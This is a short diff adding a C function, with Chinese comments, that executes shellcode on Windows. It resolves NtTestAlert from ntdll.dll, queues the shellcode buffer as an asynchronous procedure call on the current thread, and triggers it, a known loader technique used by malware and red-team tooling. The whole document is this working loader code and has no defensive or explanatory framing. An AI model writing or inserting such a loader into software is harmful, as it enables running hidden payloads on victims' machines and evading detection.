@@ -1,0 +1,14 @@
+// NtTestAlert加载方式：使用NtTestAlert函数执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] NtTestAlert方式执行Shellcode\n");
+#endif
+    typedef NTSTATUS (WINAPI *PFN_NtTestAlert)(void);
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    PFN_NtTestAlert pNtTestAlert = (PFN_NtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");
+    
+    if (pNtTestAlert) {
+        QueueUserAPC((PAPCFUNC)shellcode, GetCurrentThread(), 0);
+        pNtTestAlert();
+    }
+}
